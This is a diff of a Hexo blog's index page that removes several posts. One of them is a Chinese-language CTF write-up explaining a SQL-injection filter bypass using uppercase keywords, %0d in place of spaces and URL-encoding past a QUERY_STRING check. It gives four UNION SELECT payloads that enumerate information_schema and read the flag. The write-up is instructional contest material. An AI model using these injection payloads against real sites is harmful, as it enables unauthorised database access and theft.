@@ -71,34 +71,6 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-111111111111111111" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/02/23/111111111111111111/" class="article-date">
-  <time class="dt-published" datetime="2022-02-22T16:24:19.468Z" itemprop="datePublished">2022-02-23</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://gofervor.com/2022/02/23/111111111111111111/" data-id="ckzydcc5c0002fkv6a2fv5qr8" data-title="" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
     <article id="post-hackmepls" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/02/22/hackmepls/" class="article-date">
@@ -130,98 +102,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://gofervor.com/2022/02/22/hackmepls/" data-id="ckzydcc570000fkv60ba9aw94" data-title="" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-sql_wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/02/22/sql_wp/" class="article-date">
-  <time class="dt-published" datetime="2022-02-22T14:23:01.501Z" itemprop="datePublished">2022-02-22</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>看似过滤的很全，其实第一个过滤没有过滤大写关键字，而sql是忽略大小写的。</p>
-<p>另外空格中也没有过滤%0d，细心的同学应该可以发现，于是可以用它代替空格。</p>
-<p>第二个过滤用到了上次月赛的一道题的内容，不知道上次讲题时大家有好好听讲没【笑】，就是<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>可以获取到get时的原始字符串，甚至<strong>没有经过</strong><code>urldecode</code><strong>，但是其他函数利用参数时都会经过解码</strong>，所以如果服务器用这个来判断过滤的话，可以通过<code>urlencode</code>来绕过过滤。</p>
-<p>payload：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#爆库ctf777</span><br><span class="line">?id=0&#x27;UNION%0DSELECT%0D1,2,GROUP_CONCAT(sch%65ma_name)%0DFROM%0Dinfo%72mation_schema.schemata%23</span><br><span class="line"></span><br><span class="line">#爆表Flag0aeU</span><br><span class="line">?id=0&#x27;UNION%0DSELECT%0D1,2,GROUP_CONCAT(tabl%65_name)%0DFROM%0Dinfo%72mation_schema.tables%0Dwhere%0Dtabl%65_schema%0DLIKE%0D&#x27;ctf777&#x27;%23</span><br><span class="line"></span><br><span class="line">#爆列fla9Iove</span><br><span class="line">?id=0&#x27;UNION%0DSELECT%0D1,2,GROUP_CONCAT(column_nam%65)%0DFROM%0Dinfo%72mation_schema.columns%0Dwhere%0Dtabl%65_name%0DLIKE%0D&#x27;Flag0aeU&#x27;%23</span><br><span class="line"></span><br><span class="line">#读flag</span><br><span class="line">?id=0&#x27;UNION%0DSELECT%0D1,2,fla9Iove%0Dfrom%0Dctf777.Flag0aeU%0Dlimit%0D1,1%23</span><br></pre></td></tr></table></figure>
-
-<p>考察基础，%0d绕过空格过滤。</p>
-<p>没有过滤大写，所以可以用大写绕过关键字。</p>
-<p>输出只有一行，所以需要用limit来显示第2行。</p>
-<p>flag：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;884adfjdfi76f01c1b26951&#125;</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://gofervor.com/2022/02/22/sql_wp/" data-id="ckzydcc5d0003fkv64w4e2p9u" data-title="" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/02/22/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2022-02-22T13:01:32.311Z" itemprop="datePublished">2022-02-22</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/02/22/hello-world/">Hello World</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://gofervor.com/2022/02/22/hello-world/" data-id="ckzydcc5b0001fkv64i1sfeo9" data-title="Hello World" class="article-share-link">Share</a>
+      <a data-url="http://gofervor.com/2022/02/22/hackmepls/" data-id="ckzydnfv20000qwv65uttfjwm" data-title="" class="article-share-link">Share</a>
       
       
       
@@ -264,19 +145,7 @@
       <ul>
         
           <li>
-            <a href="/2022/02/23/111111111111111111/">(no title)</a>
-          </li>
-        
-          <li>
             <a href="/2022/02/22/hackmepls/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2022/02/22/sql_wp/">(no title)</a>
-          </li>
-        
-          <li>
-            <a href="/2022/02/22/hello-world/">Hello World</a>
           </li>
         
       </ul>
